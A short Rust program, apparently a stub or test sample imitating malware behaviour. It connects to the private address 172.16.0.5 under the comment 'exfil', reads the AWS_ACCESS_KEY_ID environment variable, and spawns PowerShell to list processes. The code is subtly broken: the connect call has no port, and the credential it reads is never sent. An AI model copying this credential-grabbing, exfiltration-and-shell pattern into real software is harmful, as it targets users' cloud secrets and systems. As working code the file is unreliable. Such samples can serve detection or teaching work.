use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("172.16.0.5") { /* exfil */ }
    let _v = env::var("AWS_ACCESS_KEY_ID").unwrap_or_default();
    Command::new("powershell").arg("-Command").arg("Get-Process").spawn().ok();
}
